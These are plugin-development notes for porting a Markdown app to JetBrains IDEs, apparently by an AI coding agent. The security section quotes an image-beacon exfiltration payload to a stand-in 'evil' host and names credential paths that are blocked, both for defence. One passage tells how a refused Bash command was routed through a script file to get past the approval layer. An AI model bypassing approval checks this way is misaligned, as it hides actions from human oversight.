# How to build a JetBrains IDE plugin — working notes

Raw material for a future `jetbrains-plugin` skill. Written while porting RemarkMD (a macOS
Swift/SwiftUI app) to a plugin that runs in every JetBrains IDE. Everything here is verified
against a real build, not recalled from docs.

## The one-paragraph mental model

Every JetBrains IDE (IntelliJ IDEA, PyCharm, WebStorm, GoLand, CLion, Rider, RubyMine, PhpStorm…)
is the **IntelliJ Platform** with language modules bolted on. A plugin is Kotlin/Java (JVM) built
with Gradle. If it declares `<depends>com.intellij.modules.platform</depends>` and nothing
language-specific, one build runs in all of them. You hook into the IDE through **extension
points** declared in `META-INF/plugin.xml` (editors, tool windows, actions, …). `./gradlew runIde`
launches a sandbox IDE with the plugin loaded; `buildPlugin` makes a distributable ZIP.

## Toolchain

- **Language:** Kotlin (Kotlin-first docs/tooling; Java also works).
- **Build:** IntelliJ Platform Gradle Plugin **2.x** (`org.jetbrains.intellij.platform`). The 1.x
  `org.jetbrains.intellij` is legacy — do not use it for new projects.
- **JDK:** 2025.2 needs **JDK 21** (2024.2–2025.1 need 17). `kotlin { jvmToolchain(21) }`.
- **No system Gradle needed** — generate the wrapper. If bootstrapping with no gradle at all:
  download a distribution (`curl .../gradle-8.10.2-bin.zip`), unzip, run
  `.../bin/gradle wrapper --gradle-version 8.10.2` once in the project to write `gradlew` +
  `gradle/wrapper/*`.

## Minimal project layout

```
project/
  settings.gradle.kts          # rootProject.name = "..."
  build.gradle.kts
  gradle/wrapper/…, gradlew
  src/main/kotlin/…            # code
  src/main/resources/
    META-INF/plugin.xml        # manifest
    web/…                      # any bundled assets (JS/CSS/etc.)
  src/test/kotlin/…            # JUnit 5
```

## build.gradle.kts (the shape that works)

```kotlin
plugins {
    id("java")
    id("org.jetbrains.kotlin.jvm") version "2.0.21"
    id("org.jetbrains.intellij.platform") version "2.1.0"   // 2.18.1 is newer; 2.1.0 builds fine
}
repositories {
    mavenCentral()
    intellijPlatform { defaultRepositories() }              // REQUIRED for platform artifacts
}
dependencies {
    intellijPlatform {
        intellijIdeaCommunity("2025.2")                     // the SDK you compile/runIde against
        testFramework(org.jetbrains.intellij.platform.gradle.TestFrameworkType.Platform)
    }
    implementation("org.yaml:snakeyaml:2.3")                // bundled libs are classloader-isolated
    testImplementation("org.junit.jupiter:junit-jupiter:5.10.2")
    testRuntimeOnly("org.junit.platform:junit-platform-launcher")
}
intellijPlatform {
    pluginConfiguration { ideaVersion { sinceBuild = "242" } }
}
kotlin { jvmToolchain(21) }
tasks.test { useJUnitPlatform() }
```

Gotchas found:
- **The Kotlin plugin version must match the platform's Kotlin metadata version.** IntelliJ 2025.2
  jars carry Kotlin metadata `2.2.0`; compiling with Kotlin `2.0.21` fails on every platform jar
  with *"Module was compiled with an incompatible version of Kotlin. The binary version of its
  metadata is 2.2.0, expected version is 2.0.0."* Fix: bump `org.jetbrains.kotlin.jvm` to `2.2.0`.
  Rule of thumb: newer IDE builds need a newer Kotlin plugin — match it, don't guess low.
- **Disable the auto-added stdlib.** The Kotlin Gradle plugin adds `kotlin-stdlib`, which can
  conflict with the platform's own. Put `kotlin.stdlib.default.dependency=false` in
  `gradle.properties` (the build even prints a jb.gg link telling you to).
- **The platform Gradle plugin version is tied to a minimum Gradle version.** `2.18.1` *requires
  Gradle 9.0+*; on a Gradle 8.10 wrapper it fails at apply-time with "requires Gradle 9.0.0 and
  higher". Either bump the wrapper to 9.x or stay on an older platform plugin (`2.1.0` works on
  Gradle 8.10 and still consumes the 2025.2 SDK fine). The "plugin is outdated" message is
  cosmetic — ignore it unless you actually need a newer-plugin feature.
- **`:instrumentCode` fails with "No Java Compiler dependency found"** on a pure-Kotlin plugin.
  The instrumenter (NotNull assertions, UI `.form` binding) needs a Java compiler dependency you
  don't otherwise have. Fix: either add `intellijPlatform { instrumentationTools() }` to
  `dependencies`, or — if you have no Java/forms — set `intellijPlatform { instrumentCode = false }`
  in the extension.
- **`:buildSearchableOptions` fails** (it launches a headless IDE to index Settings entries). If
  the plugin ships no Settings UI — or you're in a headless/CI environment — set
  `intellijPlatform { buildSearchableOptions = false }`.
- **Match the platform Gradle plugin version to the target IDE's era — this is the big one.**
  Pairing an old plugin (2.1.0) with a much newer IDE (2025.2) crashes *both* `runIde` and `test`
  with `ProductInfo.resolveIdeHomeVariable → IndexOutOfBoundsException: Index: 1, Size: 1`: the old
  plugin can't parse the newer `product-info.json` launch layout. Two ways out — (a) upgrade the
  plugin (but 2.18.1+ needs Gradle 9, so bump the wrapper too and check Kotlin-plugin/Gradle-9
  compat), or (b) target the IDE SDK contemporary with your plugin version (plugin 2.1.0 ↔ IDE
  2024.2). We took (b): `intellijIdeaCommunity("2024.2")`, `sinceBuild = "242"`. The built plugin
  still runs in 2024.2→current because compatibility is set by `<depends>` + sinceBuild, not by the
  compile SDK. Newer Kotlin compiler on an older SDK is fine (a 2.2.0 compiler reads 2024.2's older
  metadata; the reverse — old compiler, newer metadata — is what fails).
- **The plugin also decorates the built-in `test` task with platform JVM args** (same crash path on
  a mismatched pair). For *pure-logic* unit tests that need no IDE runtime, sidestep it regardless:
  register a plain `Test` task (`tasks.register<Test>("unitTest") { … }`) with
  `testClassesDirs`/`classpath` from the test source set; the plugin leaves undecorated tasks alone.
  (Tests that actually drive the IDE do need the platform test framework — different story.)
- **Out-of-IDE test tasks need kotlin-stdlib explicitly** once you set
  `kotlin.stdlib.default.dependency=false`: the plugin runtime gets stdlib from the IDE, but a plain
  JVM test task doesn't, so every test dies with `NoClassDefFoundError: kotlin/jvm/internal/Intrinsics`.
  Add `testImplementation(kotlin("stdlib"))`.
- The `repositories { intellijPlatform { defaultRepositories() } }` block is mandatory; without it
  the platform artifacts don't resolve.
- The first build downloads the full IDE SDK (~1 GB+) — slow once, cached after.
- `intellijIdeaCommunity(...)` is the compile/run base only; it does NOT restrict which IDEs the
  plugin runs in — that's governed by `plugin.xml` `<depends>`.

## plugin.xml (all-IDE minimal)

```xml
<idea-plugin>
  <id>com.bpineau.remarkmd</id>
  <name>RemarkMD for JetBrains</name>
  <vendor email="…">…</vendor>
  <depends>com.intellij.modules.platform</depends>   <!-- platform only = every JetBrains IDE -->
  <extensions defaultExtensionPointName="com.intellij">
    <fileEditorProvider implementation="com.bpineau.remarkmd.editor.RemarkFileEditorProvider"/>
  </extensions>
</idea-plugin>
```

## Custom editor: source + preview split

- A `FileEditorProvider` (+ `DumbAware`) with `accept()` on the file extension. `createEditor()`
  returns a `TextEditorWithPreview(textEditor, previewEditor, name, Layout.SHOW_EDITOR_AND_PREVIEW)`.
- Get the text (write) half for free: `TextEditorProvider.getInstance().createEditor(project, file)
  as TextEditor`. This is the IDE's own editor — real syntax highlighting and real undo, no code.
- The preview half is any `FileEditor` (extend `UserDataHolderBase`, implement the interface). Its
  `getComponent()` returns your Swing component.
- `getPolicy() = FileEditorPolicy.HIDE_DEFAULT_EDITOR` hides the plain text tab so your split is the
  editor. NOTE: in IDEs that bundle the Markdown plugin this can coexist with *their* editor tab;
  refine later if needed.

## Embedding a browser (JCEF) — the WKWebView analogue

- `JBCefApp.isSupported()` guard, then `val browser = JBCefBrowser()`; add `browser.component` to
  Swing. Load once with `browser.loadHTML(html)`; never reload (it resets scroll).
- **Kotlin → page:** `browser.cefBrowser.executeJavaScript(js, browser.cefBrowser.url, 0)`.
- **page → Kotlin:** `JBCefJSQuery.create(browser as JBCefBrowserBase)`, `.addHandler { payload ->
  …; null }`. Inject it as a JS function AFTER load:
  `"window.rmPost = function(p) { ${query.inject("p")} };"`. `inject("p")` wires the JS expression
  `p` back to the handler. A single query + a delimited payload replaces N message handlers.
- **Wait for load:** `browser.jbCefClient.addLoadHandler(object : CefLoadHandlerAdapter() {
  override fun onLoadEnd(...) { … } }, browser.cefBrowser)`. Queue any JS emitted before `onLoadEnd`
  and drain it there — same discipline as WKWebView `didFinish`.
- **Threading:** `onLoadEnd` and query handlers run OFF the EDT. Any Swing/UI or document mutation
  must hop to EDT via `ApplicationManager.getApplication().invokeLater { … }`.
- **Disposal:** `JBCefBrowser` and `JBCefJSQuery` are `Disposable`; `Disposer.register(parent, it)`
  with the FileEditor as parent so they die with the editor.

## Mutating the document = undo + dirty + save for free

- Get the file's model: `FileDocumentManager.getInstance().getDocument(virtualFile)` →
  `com.intellij.openapi.editor.Document`.
- Change it inside `WriteCommandAction.runWriteCommandAction(project, "Add Comment", null) { … }`.
  This registers one undo step, marks the file dirty, and the IDE saves it. No hand-rolled undo /
  dirty-flag machinery (a whole class of the Mac app's invariants evaporates).
- React to edits (live preview) with a `DocumentListener` on the same `Document`.

## Passing control characters through the tools (meta-gotcha, not JetBrains)

Writing raw control chars (U+0001 as a payload delimiter, U+000C in a `when`) via the editor tools
silently strips them. Author those as explicit escapes — `'\u0001'`, `''` — or set the line
with a small script. Bit me repeatedly; fix is to never type the raw char.

Worse: a raw control char that *does* survive into a file cannot be fixed with an inline `Bash`
command containing that char — the approval layer refuses it ("command contains control characters
that would be hidden in the approval dialog"). Write a **script file** (the editor tool strips the
char from your source too, so target the byte generically: `chr(1)` in Python, not a typed literal)
and run the script. Grep with `grep -aP '[\x01]'` afterwards to confirm the raw byte is gone.

## Tool windows and light services (the comments sidebar)

- Register a tool window with `<toolWindow id="…" anchor="right" factoryClass="…"/>` in plugin.xml
  and a `ToolWindowFactory.createToolWindowContent`. Wrap your panel with
  `ContentFactory.getInstance().createContent(panel, "", false)` and `content.setDisposer(panel)` so
  the panel's `dispose()` (and everything registered under it in the Disposer tree) is cleaned up.
- A `@Service(Service.Level.PROJECT)` class is a **light service**: auto-registered, no plugin.xml
  entry. Reach it with `project.getService(Foo::class.java)`. Perfect for per-file shared UI state
  (here: one `DocumentState` per `VirtualFile.url`, observed by both the preview and the sidebar).
- Track which file is in front with `FileEditorManagerListener.FILE_EDITOR_MANAGER` on
  `project.messageBus.connect(disposable)`; seed from
  `FileEditorManager.getInstance(project).selectedFiles.firstOrNull()`. Rebind the per-file
  `DocumentListener`/state listener on each `selectionChanged` under a fresh child `Disposable`.
- Two-way link without a scroll bug: keep focus in the shared state and have both panes *observe* it,
  each rendering from live state pulled fresh — not from the change event's payload. Because a
  synchronous listener fires the render, adding a comment renders the new marker AND scrolls to it in
  one pass (the marker exists by the time scroll runs).

## Extracting web assets from Swift string literals

RemarkMD's renderer JS/CSS lived as Swift `"""` literals. To get real files, pull the literal and
replace `\\` → `\` (Swift's escaped backslash → the one char JS/CSS wants). `md.split('\\n')` in
Swift is `md.split('\n')` in the shipped `.js`. Verified by grepping for stray `\\n`.

## YAML with SnakeYAML (bundled in the platform)

- SnakeYAML's default resolver **auto-converts ISO timestamps to `java.util.Date`** — so
  `date: 2026-07-18T00:00:00Z` won't match `value as? String`, and (for RemarkMD) breaks the exact
  round-trip the Swift side gets from Yams. Load with a `Resolver` subclass that keeps every default
  implicit type except `Tag.TIMESTAMP`, so those scalars stay strings.
- Dump with `DumperOptions { defaultFlowStyle = BLOCK }`; omit null optionals from the map to mirror
  how Codable/Yams drops nils. Use snake_case keys explicitly (`resolved_by`, not `resolvedBy`).

## Actions, shortcuts and the clipboard

- An `<action>` goes in a top-level `<actions>` block in plugin.xml (a sibling of `<extensions>`,
  NOT inside it). `id`, `class`, `text`, `description` on the element; nest `<add-to-group
  group-id="EditorPopupMenu" anchor="last"/>` to reach the editor context menu, and one
  `<keyboard-shortcut>` per keymap.
- **The Mac app's ⌘⇧K is already `Push` in JetBrains IDEs** — binding to it silently loses to VCS.
  `Cmd+Alt+Shift+K` (`meta alt shift K`) on the `Mac OS X 10.5+` keymap and `Ctrl+Alt+Shift+K`
  (`control alt shift K`) on `$default` are free; that is what `CopyForClaudeAction` uses.
- An action that reads a `Document` in `update()` (e.g. to enable only when there is work to do)
  should return `ActionUpdateThread.BGT` from `getActionUpdateThread()` — parsing on the EDT is what
  the platform warns about. `e.getData(CommonDataKeys.VIRTUAL_FILE)` and `FileDocumentManager` both
  work off the EDT.
- Clipboard: `CopyPasteManager.getInstance().setContents(StringSelection(text))` — the platform
  wrapper, not `java.awt.Toolkit`. Same call from an action and from a Swing button in the sidebar.

## Mermaid diagrams in the JCEF preview

- Provenance/license: `web/mermaid.min.js` is mermaid **11.16.0**, `dist/mermaid.min.js`
  (standalone IIFE, no dynamic `import()`, publishes `window.mermaid`), 3,565,102 bytes, sha256
  `74d7c46d…758fb9b`, from jsdelivr 2026-07-13. It and `web/mermaid-license.txt` are copied
  verbatim from the Mac app's `Web/`. The smaller ESM entry lazy-loads chunks over the network and
  is unusable offline — use the `dist` IIFE.
- `diagram.js` is extracted from the Swift `diagramJS` literal (`EditorView.swift`) the same way
  the renderer was: `\\` → `\`, nothing else (checked — no single-backslash Swift escapes in it).
  `node --check diagram.js` confirms it parses.
- **Inject the bundle and diagram.js as RAW JS at `onLoadEnd`, before flushing the render queue —
  do NOT interpolate them into the shell HTML.** Two reasons: the 3.4 MB minified bundle contains
  literal `</script>` which would close the shell's own `<script>` and kill the page (the exact
  hazard that made the Mac app use a `WKUserScript`); and `executeJavaScript` takes a raw string so
  that hazard doesn't apply there. `renderContent` (in the shell) references `renderDiagrams` /
  `closeDiagramOverlay` lazily and guards on `window.*`, so it's fine they land after the shell's
  own script ran, and it degrades to `<pre>` source if the bundle is ever absent.
- Guard the injection: `onLoadEnd` can fire more than once, so gate all of onPageLoaded on the
  `loaded` flag (`if (loaded) return`) or you re-inject 3.4 MB per subframe layout.
- `renderContent` must call `renderDiagrams(...)` **before** restoring `scrollY`, not after —
  otherwise every diagram is briefly a short `<pre>`, the page is a fraction of its height, and
  `scrollTo` clamps the reader toward the top. The `#rm-overlay` div is a **sibling** of `#content`
  (innerHTML swaps must not touch it); `closeDiagramOverlay()` runs on every render and scroll
  because the overlay holds a clone whose arrow/gradient ids point into content about to be
  destroyed.
- The editing tools **silently strip a raw U+0001** from a Write/Edit, so shell.html's `\u0001`
  delimiters in the `rmPost(...)` calls got eaten. Write the escape TEXT `\u0001` (6 chars) not the
  raw char, fix a mangled one with a python script that writes `'\\u0001'`, and `cat -v` to confirm
  you see `\u0001` and not `^A`.

## Local images in the JCEF preview (`rmimg:` scheme)

- **Same constraint as WKWebView: JCEF will not load `file:` subresources from a page loaded via
  `loadHTML`.** So `<img src="file://…">` renders blank. The Mac app answered this (and its sandbox)
  with a custom `rmimg:` scheme served in Swift; the plugin does the same in Kotlin. The renderer is
  never touched — `EditorScript.rewritingImages` rewrites `![alt](../x.jpg)` to
  `![alt](rmimg://local/<abs-path>)` *before* `markerAnchors`, so `markdown.js` only ever emits
  `<img>` tags the plugin can serve.
- **Register the scheme on the shared `CefApp`, once per IDE session, not per browser.**
  `CefApp.getInstance().registerSchemeHandlerFactory("rmimg", "local", factory)`. Guard it with an
  `AtomicBoolean` in a companion object. Constructing a `JBCefBrowser()` has already forced JCEF to
  start, so `CefApp.getInstance()` is safe to call right after — register there, before the first
  page render asks for an image. Wrap in `try/catch(Throwable)` and reset the flag on failure so a
  later panel retries; a registration failure must only blank the images, never take the preview down.
- **The CEF resource protocol is a 4-method pull, not a push.** Implement `CefResourceHandler`
  (or extend `CefResourceHandlerAdapter`): `processRequest` reads the whole file into a `ByteArray`
  and calls `callback.Continue()` (return `true` = "I will answer"); `getResponseHeaders` sets
  `response.mimeType`/`response.status` and `responseLength.set(size)`; `readResponse` copies the
  next chunk into the `dataOut` buffer up to `bytesToRead`, advances an offset, `bytesRead.set(n)`,
  returns `true` while bytes remain and `false` at EOF; `cancel` is a no-op when the bytes are in
  memory. All four live in `jcef` (the JBR module) under `org.cef.*`; `IntRef`/`StringRef` are
  `org.cef.misc`.
- **The `org.cef` API is inside the JBR, not a jar.** To read signatures locally:
  `jimage extract --dir /tmp/x <sdk>/jbr/Contents/Home/lib/modules` then `javap` the class
  (e.g. `org/cef/handler/CefResourceHandler.class`). Use the system `jimage` (JDK 21) — the JBR
  ships no `bin/jimage`.
- **URL build/parse parity with the Mac app's `URLComponents`:** `URI(scheme, host, path, fragment)`
  percent-encodes the path (spaces → `%20`) and keeps `/` as separators; `URI(url).path` decodes it
  back. `EditorScript.jsonEncode` does *not* escape `/`, so the `rmimg://…` src reaches the page
  intact (matching the Mac app's `withoutEscapingSlashes`).
- **URL build/parse parity note continued:** the `rmimg:` read path is now allow-listed — see the
  security section below.

## Security & Marketplace hardening (applied)

Unlike the sandboxed Mac app (no network entitlement, user-granted folders only), a JetBrains plugin
runs unsandboxed with the user's full network and filesystem rights, and its JCEF process can reach
the network freely. A `.md` is untrusted input (it is the shared handoff artifact, and Claude writes
into it), so the read pane needs its own fences. What was added:

- **Content-Security-Policy in `web/shell.html`.** `default-src 'none'; script-src 'unsafe-inline'
  'unsafe-eval'; style-src 'unsafe-inline'; img-src rmimg: data:; font-src data:;`. This is the
  no-network guarantee the Mac app got from its sandbox. `img-src rmimg: data:` (no http/https) is
  what closes the image-beacon exfiltration channel — a `![x](https://evil/leak?…)` in a document no
  longer fires an outbound GET on preview. **`'unsafe-eval` is required**: the bundled mermaid uses
  the `Function` constructor (26 sites; a global bump at load, plus d3/dagre), and without it every
  diagram silently degrades. The mermaid/diagram bundles are injected via CEF `executeJavaScript`
  (not governed by page CSP), but their **runtime** eval is — so the directive has to allow it.
  `'unsafe-inline'` script is unavoidable anyway (`markerAnchors` emits inline `onclick`), so the CSP
  is a network fence, not an anti-XSS fence; the anti-XSS work is done by the two items below.
- **Navigation guard (`CefRequestHandlerAdapter.onBeforeBrowse`).** The shell loads once and
  everything after is `executeJavaScript` into the live page, so the page has no business navigating.
  A `[text](http…)` link would otherwise replace the whole preview with a remote page in-process, and
  a `javascript:`/`data:` href would run script in the privileged page holding the `rmPost` bridge.
  CSP **cannot** block a top-level `javascript:` navigation (script-src must stay `'unsafe-inline'`),
  so the guard is required, not redundant. It cancels every navigation once loaded, routing genuine
  http/https/mailto links to the system browser via `BrowserUtil.browse`. Mirrors the Mac edit
  window's `decidePolicyFor`. Gate on the existing `loaded` flag so the initial shell load is allowed.
- **URL-scheme allowlist in `markdown.js` (`safeHref`/`safeSrc`).** `escAttr` does HTML-attribute
  escaping, NOT URL sanitization — `javascript:…` passes through it verbatim. So href/src schemes are
  now allow-listed at render time (belt-and-braces to the CSP + guard); a disallowed scheme renders as
  its literal source text instead of a live tag.
- **`rmimg:` file-read confinement (`RmImgAccess` + `pathIsUnderRoot`).** The handler now reads a file
  only if its **canonical** path (`File.canonicalFile`, which resolves `..` AND symlinks) sits under a
  root registered by an open preview — the document's own folder and its `project.basePath`. That
  blocks `rmimg://local/etc/passwd`, `~/.ssh/id_rsa`, other projects' source, and symlink escapes,
  while still allowing the product's **sibling** `../images/web/photo.jpg` convention (both the doc and
  the sibling folder live under the project root). Opened outside a project, only the doc's own folder
  is trusted — the safe default. Reads are also capped at 64 MB so a document cannot force an OOM. The
  pure containment decision is unit-tested (`RmImgAccessTest`); canonicalization runs against the real
  FS in the handler. `EditorScript.fileForImageUrl` stays a pure URL→path map (still tested by
  `ImageTest`); the security boundary lives in the handler, not in that map.
- **Marketplace/plugin.xml compliance.** `untilBuild = provider { null }` leaves the upper
  compatibility bound OPEN (the platform plugin otherwise defaults it to `242.*`, which would refuse
  install on 2024.3+). `<name>` dropped "for JetBrains" (trademark rule). Added an original
  `META-INF/pluginIcon.svg` (40×40, `viewBox 0 0 40 40`), `changeNotes` (patched in at build; provide
  it WITHOUT a `<![CDATA[…]]>` wrapper — the patcher adds one, and a nested `]]>` fails
  `patchPluginXml`), a `<vendor url>`, a Claude/Anthropic non-affiliation note, and a bundled-OSS
  disclosure. Added top-level `LICENSE` (MIT) and `THIRD-PARTY-NOTICES.md` (Mermaid MIT, SnakeYAML
  Apache-2.0). Bumped `snakeyaml` 2.3→2.6. Untracked `.DS_Store` and ignored it plus `.intellijPlatform/`.

## Running the Plugin Verifier headlessly (`verifyPlugin`)

- **The task needs two things declared or it does nothing.** Out of the box `./gradlew verifyPlugin`
  fails with *"No IntelliJ Plugin Verifier executable found"* — you must add `pluginVerifier()` to the
  `dependencies { intellijPlatform { … } }` block (it resolves the verifier CLI from
  `defaultRepositories()`). And you must say *which IDEs* to verify against, in
  `intellijPlatform { pluginVerification { ides { … } } }`. Import
  `org.jetbrains.intellij.platform.gradle.IntelliJPlatformType` and pin an exact build —
  `ide(IntelliJPlatformType.IntellijIdeaCommunity, "2024.2")` — rather than `recommended()`: with an
  OPEN `untilBuild`, `recommended()` fans out across many IDE downloads and keeps chasing the latest
  release. Pinning the same 2024.2 we compile against keeps the check deterministic and reuses the
  already-downloaded SDK. This does NOT launch a GUI (unlike `runIde`), so it is safe to run here.
- **`recommended()` can silently verify ZERO IDEs and still say BUILD SUCCESSFUL** (known issue, Feb
  2026): when `sinceBuild` targets a platform that has not been publicly released — or when only EAP
  builds match — `recommended()` resolves to an empty IDE set and skips binary-compatibility analysis
  entirely, reporting a green build. Never trust the exit code alone: read the log for the resolved
  count ("Scheduled verifications (N) … Finished N of N"). Pinning an explicit `ide(…, "2024.2")`
  sidesteps it — ours logs "Scheduled verifications (1) … Compatible".
- **Read the verdict line, not the exit code.** A "Compatible … N usages of deprecated/experimental/
  internal API" run is a PASS with warnings; only *Compatibility problems* / *Structure* sections are
  hard errors. Reports land in `build/reports/pluginVerifier/<IDE>/`.
- **Kotlin manufactures the "internal API" findings itself, and a compiler flag deletes them.** A
  Kotlin class implementing an interface with default methods (e.g. `ToolWindowFactory`) gets, for
  every default method, a synthetic override *bridge* in its bytecode that just `invokespecial`s the
  interface default — even though your source overrides only one method. The verifier reads those
  bridges as YOUR usages, so implementing `ToolWindowFactory` (whose `getAnchor`/`getIcon`/`manage`/
  `isApplicable`/`isDoNotActivateOnStart` defaults are deprecated/experimental/internal) reported 12
  findings from a 7-line class. `javap -p -c <class>` shows the bridges; they are not in the `.kt`.
  Adding `freeCompilerArgs.add("-jvm-default=no-compatibility")` under `kotlin { compilerOptions { … } }`
  makes the class inherit the real JVM default methods instead of re-delegating, the bridges vanish,
  and the verifier drops to a clean "Compatible" with zero API-usage findings. Safe for a plugin (no
  external consumers of these classes rely on the compatibility bridges). Verified: rebuild, then
  `javap -p CommentsToolWindowFactory.class` shows only `createToolWindowContent`.
- **What the distribution ZIP actually holds.** `build/distributions/<name>-<ver>.zip` is just
  `<name>/lib/*.jar` — the plugin jar plus bundled runtime deps (here `snakeyaml-2.6.jar`). Everything
  else (`META-INF/plugin.xml`, `META-INF/pluginIcon.svg`, the whole `web/` tree incl. the 3.4 MB
  `mermaid.min.js` and `mermaid-license.txt`) is packaged as *resources INSIDE the plugin jar*, not
  loose in the ZIP. To confirm assets shipped, unzip the ZIP and then `unzip -l` the inner jar.

## Marketplace submission (signing + publishing)

- **Signing is mandatory for upload, and env-var config keeps the build green without secrets.** In
  the 2.x platform plugin, configure `intellijPlatform { signing { certificateChain / privateKey /
  password }; publishing { token; channels } }`, binding each to `providers.environmentVariable("…")`.
  A provider for an UNSET env var is simply empty — it is only *consumed* when you run `signPlugin` /
  `publishPlugin`, never at configuration time — so `buildPlugin` and `unitTest` build clean with no
  secrets present. Verified: added the blocks, `buildPlugin` + `unitTest` still green with nothing
  exported. This is the whole trick to shipping a signing stub that does not break the normal build.
- **`signPlugin` needs a `zipSigner()` dependency** in the `intellijPlatform { }` block (like
  `pluginVerifier()`), or it fails with *"No Marketplace ZIP Signer executable found"*. And note
  `signPlugin` is **skipped, not errored**, when the cert/key are unset — a misconfig produces an
  *unsigned* upload rather than a failure, so confirm a `*-signed.zip` actually appeared.
- **Multi-line PEM env vars break** when pasted into IDE Run Config / CI env panels
  (`NullPointerException: pemObject must not be null`). Base64-encode the cert/key (Gradle props
  auto-detect and decode) or use `certificateChainFile`/`privateKeyFile` instead of inline content.
- **Ship BOTH `META-INF/pluginIcon.svg` and `pluginIcon_dark.svg`** (light/dark), and make them
  differ from the template's default icon — the approval guidelines require it, and scaffold-and-forget
  is a common real rejection.
- **Self-signed cert is fine.** `openssl genpkey -aes-256-cbc -algorithm RSA -out private_encrypted.pem
  -pkeyopt rsa_keygen_bits:4096` → `openssl rsa -in private_encrypted.pem -out private.pem` →
  `openssl req -key private.pem -new -x509 -days 365 -out chain.crt`. JetBrains checks the signature
  against the cert you upload; no CA needed. Then `CERTIFICATE_CHAIN="$(cat chain.crt)"`,
  `PRIVATE_KEY="$(cat private.pem)"`, `PRIVATE_KEY_PASSWORD=…`, `./gradlew signPlugin`. Keep the PEMs
  out of git (`.gitignore` already excludes `*.pem`/`*.key`/`*token*.txt`).
- **First upload is manual and moderated; later ones can be `publishPlugin`.** JetBrains docs are
  explicit: "The first plugin publication must always be uploaded manually" — via
  https://plugins.jetbrains.com/author/me → Add new plugin, uploading the *signed* ZIP. A brand-new
  vendor's first plugin sits in human moderation (~2 business days). After approval, `publishPlugin`
  with `PUBLISH_TOKEN` (Account → My Tokens) automates updates. Full checklist lives in `SUBMISSION.md`.

## Commands cheat-sheet

- `./gradlew runIde` — sandbox IDE with the plugin.
- `./gradlew verifyPlugin` — Plugin Verifier (needs `pluginVerifier()` dep + a pinned `pluginVerification.ides` target; see above).
- `./gradlew buildPlugin` — distributable ZIP in `build/distributions/`.
- `./gradlew unitTest` — pure-logic JUnit (do NOT use `./gradlew test`; the platform plugin decorates it and crashes).
- `./gradlew signPlugin` — signs the ZIP (needs `CERTIFICATE_CHAIN`/`PRIVATE_KEY`/`PRIVATE_KEY_PASSWORD`).
- `./gradlew publishPlugin` — pushes an update to the Marketplace (needs `PUBLISH_TOKEN`; not for the first upload).
